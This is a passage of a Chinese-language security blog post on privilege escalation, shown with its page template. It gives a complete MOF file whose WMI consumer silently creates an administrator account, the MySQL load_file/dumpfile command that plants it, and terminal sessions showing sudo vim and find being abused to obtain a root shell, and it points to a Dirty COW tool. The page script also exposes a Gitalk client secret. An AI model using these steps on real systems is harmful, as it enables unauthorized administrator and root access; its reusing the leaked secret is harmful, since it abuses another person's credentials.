+<p>2.蚁剑连接数据库</p>
+<p>执行命令</p>
+<blockquote>
+<p>select user(); 查看当前用户</p>
+<p>show variables like “%secure%”; 查看secure-file-priv参数</p>
+</blockquote>
+<p>3.上传nullevt.mof文件到目标机的c:\recycler文件夹下，然后写入到c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof文件夹下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;;  //5s执行一次 </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">	&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user test01 123 /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators test01 /add\&quot;)&quot;;   //要执行的命令</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
+
+<p>上传后，执行语句</p>
+<p><code>select load_file(&#39;CL\\RECYCLER\\nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;</code></p>
+<p>如果写入失败就算了。</p>
+<p>其实如果目标机设置了<strong>给MySQL的启动用户赋予完全控制mof文件夹以及子文件夹的权限</strong>的话，那就会写入成功。</p>
+<p><strong>同时成功创建了test01管理员组用户</strong></p>
+<p>其实写可以利用现成的mof.php文件，上传上去后，访问，进行一系列输入，自动写入mof文件。</p>
+<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#4-%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83">mysql提权方法整理</a></p>
+<h1 id="2-3linux提权"><a href="#2-3linux提权" class="headerlink" title="2.3linux提权"></a>2.3linux提权</h1><p>Suid提权：普通用户去执行 root 权限的操作，而不需要知道 root 的密码</p>
+<p>第三方软件提权</p>
+<h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><strong>借助到可以执行系统指令的交互式功能。</strong>就是分配给的权限太高导致的</p>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>已知，普通用户xg有了个 <strong>vim权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">100 root    ALL=(ALL)       ALL</span><br><span class="line">101 xg      ALL=(ALL)       /bin/systemctl,/usr/bin/vim</span><br></pre></td></tr></table></figure>
+
+<p>好，在xg用户下，<code>sudo vim /etc/sudoers</code></p>
+<p>把101行的第三列替换成ALL，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[xg@xinguang /]$ sudo vim 1.txt</span><br><span class="line">[sudo] password <span class="keyword">for</span> xg:</span><br><span class="line">[xg@xinguang /]$ ll</span><br><span class="line">total 32</span><br><span class="line">-rw-r--r--.   1 root root  370 Sep 21 16:04 1.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[xg@xinguang /]$ sudo vim 1.txt</span><br><span class="line"></span><br><span class="line">(我在1.txt里面左下角那个冒号那里啊，输入了</span><br><span class="line">!<span class="built_in">touch</span> 5.txt，回车后再保存退出即可</span><br><span class="line">)</span><br><span class="line">Press ENTER or <span class="built_in">type</span> <span class="built_in">command</span> to <span class="built_in">continue</span></span><br><span class="line">[xg@xinguang /]$ ll</span><br><span class="line">total 32</span><br><span class="line">-rw-r--r--.   1 root root  370 Sep 21 16:05 1.txt</span><br><span class="line">-rw-r--r--.   1 root root    0 Sep 21 16:05 5.txt</span><br><span class="line">//看，多了个5.txt，还是root的</span><br><span class="line"></span><br><span class="line">继续</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[xg@xinguang /]$ <span class="built_in">id</span></span><br><span class="line">uid=1000(xg) gid=1000(xg) <span class="built_in">groups</span>=1000(xg) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br><span class="line">[xg@xinguang /]$ sudo vim 1.txt</span><br><span class="line"></span><br><span class="line">左下角这样：:!/bin/bash</span><br><span class="line">回车</span><br><span class="line"></span><br><span class="line">[root@xinguang /]<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过vim权限拿到bin&#x2F;bash，问你怕不怕，直接进入root用户操作终端</p>
+<p>还有 <code>find、awk</code>，但凡可以执行系统指令，都可以进到root终端哈</p>
+<p><strong>find</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[xg@xinguang /]$ sudo find /home -<span class="built_in">exec</span> bash \;</span><br><span class="line">[sudo] password <span class="keyword">for</span> xg:</span><br><span class="line">[root@xinguang /]<span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>linux内核的内存子系统，在处理写入时复制时产生了竞争条件；该漏洞将只读内存映射进行写访问</p>
+<h4 id="无实例"><a href="#无实例" class="headerlink" title="无实例"></a>无实例</h4><p>有现成的CVE-2016-5195工具嘞，解压到里面，dcow运行下就行了。</p>
+<h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><p>升级系统或提高gcc版本</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/07/01/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MYSQL%E6%8F%90%E6%9D%83/" rel="tag">MYSQL提权</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/" rel="tag">系统提权</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/07/01/%E5%AE%9E%E6%88%98/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            实战记录
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/07/01/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">漏洞汇总</div>
+      </a>
+    
+  </nav>
+
+  
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">
+
+
+<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '93da8388ad1469a8be66',
+    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
+    repo: 'blogtalk',
+    owner: 'ak005469075',
+    admin: ['ak005469075'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023-2024
+        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+  <script type="text/javascript">
+$(function () {
+    console.log("lets go！");
+    console.log("/");
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+</div>
+
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
